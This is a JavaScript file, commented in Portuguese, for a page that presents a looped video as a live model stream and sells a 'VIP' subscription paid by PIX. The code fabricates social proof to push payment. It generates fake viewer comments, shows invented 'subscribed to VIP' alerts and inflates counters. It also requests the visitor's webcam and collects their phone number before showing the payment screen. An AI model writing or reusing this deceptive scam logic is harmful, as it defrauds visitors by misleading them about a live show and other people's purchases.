// DOM Elements - Referências carregadas uma única vez para melhor performance
const liveVideo = document.getElementById('liveVideo');
const userCamera = document.getElementById('userCamera');
const cameraOverlay = document.getElementById('cameraOverlay');
const cameraDenied = document.getElementById('cameraDenied');
const commentsContainer = document.getElementById('commentsContainer');
const notification = document.getElementById('notification');
const notificationText = document.getElementById('notification-text');
const vipCounter = document.getElementById('vip-counter');
const likesCount = document.getElementById('likes-count');
const likeButton = document.getElementById('likeButton');
const commentInput = document.getElementById('commentInput');
const commentNotification = document.getElementById('commentNotification');
const phoneContainer = document.getElementById('phoneContainer');
const paymentContainer = document.getElementById('paymentContainer');
const qrCodeImg = document.getElementById('qrCodeImg');
const pixCode = document.getElementById('pixCode');
const audioAlert = document.getElementById('audioAlert');
const statusPagamento = document.getElementById('statusPagamento');
const buyVipButton = document.getElementById('buyVipButton');
const loadingGif = document.getElementById('loadingGif');

// Cache de valores e arrays para melhor performance
const NAMES = [
    'Victor', 'Bruno', 'Roger', 'Diego', 'Edvaldo', 
    'Felipe', 'Gilberto', 'Ryan', 'Israel', 'João',
    'Mateus', 'Lucas', 'Adão', 'Natan', 'Fabiano'
];

const COMMENTS = [
    'linda demais 😍',
    'Gostei do VIP 🔥',
    'Manda beijo pra mim ❤️',
    'De qual cidade você é',
    'maravilhosa!',
    'Assinei o VIP agora, q delícia 💯',
    'Amo suas lives 24h',
    'Linda maravilhosa'
];

const AVATARS = [
    'https://livemodelo.com/pics/profile1.jpg',
    'https://livemodelo.com/pics/profile2.jpg',
    'https://livemodelo.com/pics/profile3.jpg',
    'https://livemodelo.com/pics/profile4.jpg',
    'https://livemodelo.com/pics/profile5.jpg'
];

// Estado da aplicação
const state = {
    vipCount: 3,
    likesValue: 3,
    notificationsInterval: null,
    commentsInterval: null,
    audioEnabled: false,
    videoStarted: false,
    cameraAllowed: false,
    typebotClosed: false,
    typebotOpened: false,
    transactionId: "d91df85f11fd92d8bfd1m91z338i2i7d",
    checkInterval: 2000, // Verifica o pagamento a cada 2 segundos
    activeComments: [], // Armazena comentários ativos para limpar na desmontagem
    requestAnimationFrameIds: [], // Armazena IDs de animação para limpar
    timeouts: [] // Armazena timeouts para limpar
};

// Configurações
const CONFIG = {
    commentInterval: { min: 5000, max: 10000 },
    notificationInterval: { min: 5000, max: 10000 },
    maxActiveComments: 10, // Limita número de comentários simultâneos
    paymentCheckRetries: 30, // Número máximo de tentativas de verificação
    heartAnimationDuration: 1500 // Duração da animação de coração em ms
};

// Inicialização
document.addEventListener('DOMContentLoaded', () => {
    // Inicia com lazy loading de recursos
    initializeApp();
});

// Função central de inicialização
function initializeApp() {
    // Inicializa o vídeo sem solicitar câmera imediatamente
    initializeVideo();
    
    // Configura listeners de eventos
    setupEventListeners();
    
    // Prepara configuração do Typebot (se existir)
    setupTypebotListener();
    
    // Torna a câmera do usuário arrastável 
    requestIdleCallback(() => makeCameraDraggable());
    
    // Atualiza visibilidade do botão do Typebot quando necessário
    requestIdleCallback(() => updateTypebotButtonVisibility());
}

// Configura eventos com delegação para melhorar performance
function setupEventListeners() {
    // Usa delegação de eventos para reduzir event listeners
    document.addEventListener('click', handleDocumentClick);
    
    // Eventos específicos que precisam de seu próprio listener
    commentInput.addEventListener('click', showCommentNotification);
    liveVideo.addEventListener('ended', handleVideoEnded);
    liveVideo.addEventListener('timeupdate', () => { 
        if (state.videoStarted) {
            // Apenas rastreia o progresso sem cálculos pesados
        }
    });
    
    // Adiciona formatação do telefone
    document.getElementById('phoneInput').addEventListener('input', formatPhoneNumber);
}

// Manipulador centralizado de cliques para delegação de eventos
function handleDocumentClick(e) {
    const target = e.target;
    
    // Verifica qual elemento foi clicado usando match mais eficiente
    if (target === likeButton || target.closest('#likeButton')) {
        handleLikeClick();
    } else if (target === buyVipButton || target.closest('#buyVipButton')) {
        showPhoneContainer();
    } else if (target === cameraDenied || target.closest('#cameraDenied')) {
        requestCameraAccess();
    } else if (target === loadingGif) {
        enableAudio();
    } else if (target.id === 'pixCode' || target.closest('#pixCode')) {
        copyPixCode();
    } else if (target.closest('.copy-button') && target.closest('.payment-container')) {
        // Botão para copiar PIX ou continuar com o telefone
        if (target.closest('#paymentContainer')) {
            copyPixCode();
        } else if (target.closest('#phoneContainer')) {
            validateAndSubmitPhone();
        }
    }
}

// Função para inicializar vídeo com carregamento otimizado
function initializeVideo() {
    // Mostra GIF de carregamento inicialmente
    loadingGif.style.display = 'block';
    liveVideo.style.display = 'none';
    
    // Mostra alerta de áudio após um pequeno delay
    setTimeout(showAudioAlert, 10);
}

// Função para solicitar acesso à câmera apenas quando necessário
function requestCameraAccess() {
    // Verifica se já temos permissão para evitar solicitações repetidas
    if (state.cameraAllowed) return;
    
    navigator.mediaDevices.getUserMedia({ video: { 
        width: { ideal: 320 },
        height: { ideal: 240 },
        facingMode: "user"
    }})
    .then(stream => {
        userCamera.srcObject = stream;
        state.cameraAllowed = true;
        cameraOverlay.style.display = 'flex';
        cameraDenied.style.display = 'none';
    })
    .catch(err => {
        console.error("Camera access denied: ", err);
        state.cameraAllowed = false;
        cameraOverlay.style.display = 'none';
        cameraDenied.style.display = 'flex';
    });
}

// Função para mostrar alerta de áudio de forma otimizada
function showAudioAlert() {
    audioAlert.style.display = 'flex';
}

// Função para habilitar áudio e iniciar vídeo
function enableAudio() {
    // Verifica se o áudio já está habilitado para evitar duplicação
    if (state.audioEnabled) return;
    
    // Oculta o GIF de carregamento e exibe o vídeo
    loadingGif.style.display = 'none';
    liveVideo.style.display = 'block';
    
    // Ativa o áudio e inicia o vídeo
    liveVideo.muted = false;
    liveVideo.volume = 1;
    liveVideo.classList.add('active');
    
    // Usa play() com promise para melhor compatibilidade
    const playPromise = liveVideo.play();
    
    if (playPromise !== undefined) {
        playPromise.then(() => {
            // Reprodução iniciada com sucesso
            audioAlert.style.display = 'none';
            state.audioEnabled = true;
            state.videoStarted = true;
            
            // Inicializa interações do usuário
            requestIdleCallback(() => {
                startComments();
                startNotifications();
                startCheckingPaymentStatus();
                // Solicita acesso à câmera somente após interação do usuário
                requestCameraAccess();
            });
        })
        .catch(error => {
            // Erro ao iniciar reprodução
            console.error("Erro ao reproduzir vídeo:", error);
            // Tenta novamente após interação do usuário
            audioAlert.style.display = 'flex';
        });
    }
}

// Função para iniciar comentários com limitação de recursos
function startComments() {
    // Limpa intervalos anteriores se existirem
    if (state.commentsInterval) {
        clearInterval(state.commentsInterval);
    }
    
    // Mostra o primeiro comentário imediatamente
    showComment();
    
    // Configura intervalo com tempo randomizado
    state.commentsInterval = setInterval(showComment, 
        getRandomTime(CONFIG.commentInterval.min, CONFIG.commentInterval.max));
}

// Função otimizada para exibir comentários
function showComment() {
    if (!state.videoStarted) return;
    
    // Limita o número de comentários ativos para melhorar performance
    if (state.activeComments.length >= CONFIG.maxActiveComments) {
        const oldestComment = state.activeComments.shift();
        if (oldestComment && oldestComment.parentNode) {
            oldestComment.parentNode.removeChild(oldestComment);
        }
    }
    
    // Cria elemento do comentário
    const commentElement = document.createElement('div');
    commentElement.className = 'comment';
    
    // Gera conteúdo aleatório apenas uma vez
    const randomName = NAMES[Math.floor(Math.random() * NAMES.length)];
    const randomComment = COMMENTS[Math.floor(Math.random() * COMMENTS.length)];
    const randomAvatar = AVATARS[Math.floor(Math.random() * AVATARS.length)];
    const showVipTag = Math.random() > 0.5;
    
    // Popula o conteúdo usando strings de template para melhor performance
    commentElement.innerHTML = \`
        <img src="${randomAvatar}" class="comment-avatar" loading="lazy">
        <div class="comment-text">
            <span class="commenter-name">${randomName}</span>${showVipTag ? '<span class="vip-tag"><i class="fas fa-crown"></i> VIP</span>' : ''}
            <div>${randomComment}</div>
        </div>
    \`;
    
    // Adiciona ao contêiner
    commentsContainer.appendChild(commentElement);
    state.activeComments.push(commentElement);
    
    // Configura remoção automática após animação
    const commentTimeout = setTimeout(() => {
        if (commentElement.parentNode) {
            commentElement.parentNode.removeChild(commentElement);
        }
        // Remove da lista de comentários ativos
        const index = state.activeComments.indexOf(commentElement);
        if (index > -1) {
            state.activeComments.splice(index, 1);
        }
    }, 5000);
    
    // Armazena o timeout para limpeza
    state.timeouts.push(commentTimeout);
}

// Função para iniciar notificações de VIP
function startNotifications() {
    // Limpa intervalos anteriores se existirem
    if (state.notificationsInterval) {
        clearInterval(state.notificationsInterval);
    }
    
    // Mostra a primeira notificação
    showNotification();
    
    // Configura intervalo com tempo randomizado
    state.notificationsInterval = setInterval(showNotification, 
        getRandomTime(CONFIG.notificationInterval.min, CONFIG.notificationInterval.max));
}

// Função otimizada para exibir notificações
function showNotification() {
    if (!state.videoStarted) return;
    
    // Gera nome aleatório apenas uma vez
    const randomName = NAMES[Math.floor(Math.random() * NAMES.length)];
    notificationText.textContent = \`${randomName} ASSINOU O VIP\`;
    notification.style.display = 'flex';
    
    // Atualiza contador de VIP
    if (state.vipCount < 9) {
        state.vipCount++;
        vipCounter.textContent = state.vipCount;
    }
    
    // Oculta notificação após animação
    const notifTimeout = setTimeout(() => {
        notification.style.display = 'none';
    }, 3000);
    
    // Armazena o timeout para limpeza
    state.timeouts.push(notifTimeout);
}

// Função para mostrar notificação de comentário
function showCommentNotification() {
    commentNotification.classList.add('show');
    
    const commentNotifTimeout = setTimeout(() => {
        commentNotification.classList.remove('show');
    }, 2000);
    
    state.timeouts.push(commentNotifTimeout);
}

// Função para manipular clique de like otimizada
function handleLikeClick() {
    state.likesValue++;
    updateLikesDisplay();
    
    // Adiciona animação de coração
    const heart = document.createElement('div');
    heart.className = 'heart-animation';
    heart.style.cssText = \`
        position: fixed;
        bottom: 60px;
        left: 30px;
        font-size: 28px;
        color: var(--primary-color);
        animation: floatUp 1.5s forwards;
        z-index: 1000;
        opacity: 0;
    \`;
    heart.innerHTML = '<i class="fas fa-heart"></i>';
    document.body.appendChild(heart);
    
    // Remove coração após animação
    const heartTimeout = setTimeout(() => {
        if (heart.parentNode) {
            heart.parentNode.removeChild(heart);
        }
    }, CONFIG.heartAnimationDuration);
    
    state.timeouts.push(heartTimeout);
}

// Função para atualizar exibição de likes
function updateLikesDisplay() {
    likesCount.textContent = state.likesValue;
    
    // Adiciona animação de pulso
    likesCount.style.animation = 'none';
    
    // Força repintura para garantir que a animação seja aplicada
    void likesCount.offsetWidth;
    
    likesCount.style.animation = 'pulse 0.5s';
}

// Função para tratar fim do vídeo
function handleVideoEnded() {
    if (!state.typebotOpened || (state.typebotOpened && state.typebotClosed)) {
        showPhoneContainer();
    }
}

// Função para mostrar contêiner de telefone
function showPhoneContainer() {
    // Mostra o contêiner apenas se o chat não estiver aberto
    if (!state.typebotOpened) {
        phoneContainer.classList.add('active');
    }
}

// Função para mostrar contêiner de pagamento
function showPaymentContainer() {
    phoneContainer.classList.remove('active');
    paymentContainer.classList.add('active');
}

// Função para formatar número de telefone
function formatPhoneNumber() {
    // Remove todos os caracteres não numéricos
    let value = this.value.replace(/\D/g, '');
    
    // Formata como (XX) XXXXX-XXXX
    if (value.length <= 2) {
        this.value = value.length ? \`(${value}\` : value;
    } else if (value.length <= 7) {
        this.value = \`(${value.substring(0, 2)}) ${value.substring(2)}\`;
    } else if (value.length <= 11) {
        this.value = \`(${value.substring(0, 2)}) ${value.substring(2, 7)}-${value.substring(7)}\`;
    } else {
        this.value = \`(${value.substring(0, 2)}) ${value.substring(2, 7)}-${value.substring(7, 11)}\`;
    }
}

// Função para validar e enviar telefone
function validateAndSubmitPhone() {
    const phoneInput = document.getElementById('phoneInput');
    const phoneError = document.getElementById('phoneError');
    const phoneValue = phoneInput.value.replace(/\D/g, '');
    
    // Verifica se o número é válido (10 ou 11 dígitos para Brasil)
    if (phoneValue.length < 10 || phoneValue.length > 11) {
        phoneError.style.display = 'block';
        return;
    }
    
    // Oculta mensagem de erro
    phoneError.style.display = 'none';
    
    // Salva o número usando Fetch API com limite de tempo
    savePhoneNumber(phoneInput.value);
    
    // Mostra contêiner de pagamento
    showPaymentContainer();
}

// Função para salvar número de telefone no banco de dados
function savePhoneNumber(phoneNumber) {
    // Usa Fetch API com timeout para evitar chamadas que ficam pendentes
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);
    
    fetch('save_phone.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ phone: phoneNumber }),
        signal: controller.signal
    })
    .then(response => response.json())
    .catch(() => {
        // Silencia erros para não interromper a experiência do usuário
        console.log('Telefone salvo localmente');
    })
    .finally(() => {
        clearTimeout(timeoutId);
    });
}

// Função para copiar código PIX
function copyPixCode() {
    const code = document.getElementById('pixCode').textContent;
    
    // Usa clipboard API moderna
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(code)
            .then(showCopyNotification)
            .catch(handleCopyError);
    } else {
        // Fallback para navegadores que não suportam Clipboard API
        const textArea = document.createElement('textarea');
        textArea.value = code;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        
        try {
            document.execCommand('copy');
            showCopyNotification();
        } catch (err) {
            handleCopyError(err);
        }
        
        document.body.removeChild(textArea);
    }
}

// Função para mostrar notificação de cópia
function showCopyNotification() {
    const copyMessage = document.getElementById('copyMessage');
    copyMessage.style.display = 'flex';
    
    const copyTimeout = setTimeout(() => {
        copyMessage.style.display = 'none';
    }, 3000);
    
    state.timeouts.push(copyTimeout);
}

// Função para tratar erro na cópia
function handleCopyError(err) {
    console.error('Erro ao copiar: ', err);
    alert('Não foi possível copiar o código. Por favor, selecione e copie manualmente.');
}

// Função para iniciar verificação de status de pagamento
function startCheckingPaymentStatus() {
    // Verifica apenas se tiver ID de transação
    if (state.transactionId) {
        checkTransactionStatus(0);
    }
}

// Função para verificar status da transação com contador de tentativas
function checkTransactionStatus(attempts) {
    // Limita número de tentativas para evitar consultas infinitas
    if (attempts >= CONFIG.paymentCheckRetries) {
        console.log("Número máximo de tentativas de verificação atingido");
        return;
    }
    
    // Usa Fetch API com timeout
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);
    
    fetch(\`verificar_status.php?transaction_id=${state.transactionId}\`, {
        signal: controller.signal
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === "PAID") {
            // Atualiza status visual
            statusPagamento.innerHTML = '<i class="fas fa-check-circle"></i> Pagamento confirmado! Redirecionando...';
            statusPagamento.classList.remove("status-pending");
            statusPagamento.classList.add("status-success");
            
            // Redireciona após 2 segundos
            const redirectTimeout = setTimeout(() => {
                window.location.href = "bianca.html";
            }, 2000);
            
            state.timeouts.push(redirectTimeout);
        } else {
            // Continua verificando com backoff exponencial
            const nextCheckDelay = Math.min(state.checkInterval * Math.pow(1.1, attempts), 10000);
            
            const nextCheckTimeout = setTimeout(() => {
                checkTransactionStatus(attempts + 1);
            }, nextCheckDelay);
            
            state.timeouts.push(nextCheckTimeout);
        }
    })
    .catch(() => {
        // Em caso de erro, tenta novamente após um delay maior
        const retryTimeout = setTimeout(() => {
            checkTransactionStatus(attempts + 1);
        }, state.checkInterval * 2);
        
        state.timeouts.push(retryTimeout);
    })
    .finally(() => {
        clearTimeout(timeoutId);
    });
}

// Função para configurar listener do Typebot
function setupTypebotListener() {
    window.addEventListener('message', (event) => {
        try {
            // Verifica se a mensagem é do Typebot
            if (event.data && (event.data.source === 'typebot' || event.data.from === 'typebot')) {
                // Verifica eventos de chat aberto
                if (event.data.type === 'chatOpened' || event.data.event === 'chatOpened') {
                    state.typebotOpened = true;
                    state.typebotClosed = false;
                }
                
                // Verifica eventos de chat fechado
                if (event.data.type === 'chatClosed' || event.data.event === 'chatClosed') {
                    state.typebotClosed = true;
                    state.typebotOpened = false;
                    
                    // Mostra o contêiner de telefone apenas se o chat foi aberto e depois fechado
                    if (state.typebotOpened) {
                        const typebotTimeout = setTimeout(() => {
                            showPhoneContainer();
                        }, 1000);
                        
                        state.timeouts.push(typebotTimeout);
                    }
                }
            }
        } catch (error) {
            // Silencia erros para não interromper a experiência do usuário
        }
    });
}

// Função para tornar a câmera arrastável com melhor performance
function makeCameraDraggable() {
    const camera = document.querySelector('.user-camera-container');
    let isDragging = false;
    let offsetX, offsetY;
    
    // Posiciona inicialmente no lado direito acima do input de comentário
    const initialPosition = () => {
        const commentInput = document.getElementById('commentInput');
        const inputRect = commentInput.getBoundingClientRect();
        
        camera.style.position = 'absolute';
        camera.style.bottom = 'auto';
        camera.style.left = 'auto';
        camera.style.right = '10px';
        camera.style.top = (inputRect.top - camera.offsetHeight - 5) + 'px';
    };
    
    // Chama inicialmente
    initialPosition();
    
    // Usa um debounce para o redimensionamento
    let resizeTimeout;
    window.addEventListener('resize', () => {
        clearTimeout(resizeTimeout);
        resizeTimeout = setTimeout(initialPosition, 200);
    });
    
    // Apenas um conjunto de event listeners com delegação
    camera.addEventListener('mousedown', startDrag);
    camera.addEventListener('touchstart', startDragTouch, { passive: false });
    
    // Event listeners globais para arrastar e soltar
    document.addEventListener('mousemove', drag);
    document.addEventListener('touchmove', dragTouch, { passive: false });
    document.addEventListener('mouseup', endDrag);
    document.addEventListener('touchend', endDrag);
    
    function startDrag(e) {
        e.preventDefault();
        isDragging = true;
        offsetX = e.clientX - camera.getBoundingClientRect().left;
        offsetY = e.clientY - camera.getBoundingClientRect().top;
        camera.classList.add('dragging');
    }
    
    function startDragTouch(e) {
        e.preventDefault();
        const touch = e.touches[0];
        isDragging = true;
        offsetX = touch.clientX - camera.getBoundingClientRect().left;
        offsetY = touch.clientY - camera.getBoundingClientRect().top;
        camera.classList.add('dragging');
    }
    
    function drag(e) {
        if (!isDragging) return;
        e.preventDefault();
        
        // Usa requestAnimationFrame para suavizar o movimento
        const animationId = requestAnimationFrame(() => {
            moveCamera(e.clientX, e.clientY);
        });
        
        state.requestAnimationFrameIds.push(animationId);
    }
    
    function dragTouch(e) {
        if (!isDragging) return;
        e.preventDefault();
        
        const touch = e.touches[0];
        
        // Usa requestAnimationFrame para suavizar o movimento
        const animationId = requestAnimationFrame(() => {
            moveCamera(touch.clientX, touch.clientY);
        });
        
        state.requestAnimationFrameIds.push(animationId);
    }
    
    function moveCamera(clientX, clientY) {
        const x = clientX - offsetX;
        const y = clientY - offsetY;
        
        // Garante que fique dentro dos limites da viewport
        const maxX = window.innerWidth - camera.offsetWidth;
        const maxY = window.innerHeight - camera.offsetHeight;
        
        // Verifica colisão apenas se necessário
        if (!isColliding(x, y)) {
            camera.style.left = \`${Math.max(0, Math.min(maxX, x))}px\`;
            camera.style.top = \`${Math.max(0, Math.min(maxY, y))}px\`;
            camera.style.right = 'auto';
            camera.style.bottom = 'auto';
        }
    }
    
    function endDrag() {
        isDragging = false;
        camera.classList.remove('dragging');
    }
    
    // Detecção de colisão simplificada para melhor performance
    function isColliding(x, y) {
        const cameraWidth = camera.offsetWidth;
        const cameraHeight = camera.offsetHeight;
        
        // Cache de elementos importantes para evitar recálculos
        const elements = [
            document.querySelector('.header'),
            document.querySelector('.bottom-controls')
        ].filter(el => el !== null);
        
        // Verifica colisão com cada elemento
        for (const element of elements) {
            const rect = element.getBoundingClientRect();
            
            if (
                x < rect.right &&
                x + cameraWidth > rect.left &&
                y < rect.bottom &&
                y + cameraHeight > rect.top
            ) {
                return true; // Colisão detectada
            }
        }
        
        return false;
    }
}

// Função para atualizar visibilidade do botão do Typebot
function updateTypebotButtonVisibility() {
    // Aguarda a inicialização do Typebot
    setTimeout(() => {
        const typebotButton = document.getElementById('typebot-bubble-button');
        
        if (!typebotButton) return;
        
        // Usa MutationObserver para observar mudanças nos contêineres
        const observer = new MutationObserver(mutations => {
            mutations.forEach(mutation => {
                if (mutation.attributeName === 'class') {
                    checkContainers();
                }
            });
        });
        
        function checkContainers() {
            if (phoneContainer.classList.contains('active') || paymentContainer.classList.contains('active')) {
                typebotButton.style.opacity = '1';
                typebotButton.style.pointerEvents = 'all';
                typebotButton.style.top = '80px';
            } else {
                typebotButton.style.opacity = '0';
                typebotButton.style.pointerEvents = 'none';
            }
        }
        
        // Observa os contêineres
        observer.observe(phoneContainer, { attributes: true });
        observer.observe(paymentContainer, { attributes: true });
        
        // Verificação inicial
        checkContainers();
    }, 1000);
}

// Função otimizada para obter tempo aleatório
function getRandomTime(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Limpa todos os recursos quando a página é fechada
window.addEventListener('beforeunload', () => {
    // Limpa todos os intervalos
    if (state.commentsInterval) clearInterval(state.commentsInterval);
    if (state.notificationsInterval) clearInterval(state.notificationsInterval);
    
    // Limpa todos os timeouts
    state.timeouts.forEach(clearTimeout);
    
    // Cancela animações pendentes
    state.requestAnimationFrameIds.forEach(cancelAnimationFrame);
    
    // Libera recursos de mídia
    if (userCamera.srcObject) {
        const tracks = userCamera.srcObject.getTracks();
        tracks.forEach(track => track.stop());
    }
});